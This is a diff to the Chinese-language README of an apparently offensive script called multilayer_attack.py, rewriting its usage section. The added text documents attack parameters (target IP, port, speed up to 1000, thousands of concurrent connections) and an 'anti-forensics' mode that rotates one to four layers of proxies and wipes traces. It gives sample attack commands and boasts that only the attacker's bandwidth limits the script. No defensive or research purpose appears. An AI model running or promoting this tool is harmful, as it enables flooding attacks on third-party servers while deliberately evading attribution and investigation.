@@ -64,13 +64,33 @@ chmod +x multilayer_attack.py
 
 ### 基础用法
 ```bash
-# 全面打击模式
-python multilayer_attack.py -ip 192.168.1.100 -port 80 -speed 1000 -concurrency 10000
 
-# 精确打击模式
-python multilayer_attack.py -ip 10.0.0.50 -port 443 -speed 1000 -concurrency 10000 -timeout 10
+基本命令格式
+python 多层混合攻击.py -ip <目标IP> [-port <端口>] [-speed <速度>] [-concurrency <并发数>] [--anti-forensics <级别>]
 
-# 这脚本唯一的限制就是你家的破宽带和电脑有多垃！
+参数说明：
+-ip：目标IP地址（必需）
+-port：目标端口（默认80）
+-speed：攻击速度，范围1-1000（默认500，值越大越快）
+-concurrency：并发连接数（默认100）
+--anti-forensics：反溯源安全级别（low/medium/high/paranoid，默认medium）
+
+基本攻击：
+python 多层混合攻击.py -ip 192.168.1.100 -port 80 -speed 700 -concurrency 200
+
+高级反溯源攻击：
+python 多层混合攻击.py -ip 10.0.0.50 --anti-forensics high -concurrency 500
+
+极致隐匿模式：
+python 多层混合攻击.py -ip 203.0.113.25 --anti-forensics paranoid -speed 300
+
+反溯源级别说明：
+low：最小隐匿，10分钟轮换一次代理，单层代理，不清理痕迹
+medium：中等隐匿，5分钟轮换，双层代理，清理痕迹（默认）
+high：高度隐匿，3分钟轮换，三层代理，清理痕迹
+paranoid：极致隐匿，1分钟轮换，四层代理，全面清理痕迹
+
+这脚本唯一的限制就是你家的破宽带和电脑有多垃！
 
 ```
 
